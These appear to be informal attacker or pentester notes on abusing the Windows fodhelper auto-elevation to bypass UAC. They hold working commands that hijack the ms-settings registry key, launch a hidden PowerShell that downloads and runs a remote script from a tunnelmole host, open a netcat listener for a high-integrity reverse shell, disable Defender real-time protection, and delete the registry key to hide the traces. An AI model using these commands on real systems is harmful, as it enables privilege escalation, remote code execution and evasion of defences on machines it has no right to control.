Fodhelper

Check if auto elevate is linked to this particular executable:
powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I "autoElevate"

Next, we need to be cmd.exe for these registry settings

Now we set some registry keys to abuse this weaknesses and use it's autoelevate and it's high Integrity level to escalate our priveleges:
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)>"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f

Time to start a listener and get high priveleged integrity level:
rlwrap nc -lvnp 443
fodhelper.exe

Clearing our tracks:
reg delete HKCU\Software\Classes\ms-settings\ /f

===============

from fodhelper uac bypass with powershell


New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\ryan\desktop\ninja22.ps1" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

Turn off AV
Set-MpPreference -DisableRealtimeMonitoring $true

==

==
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)>" -Force


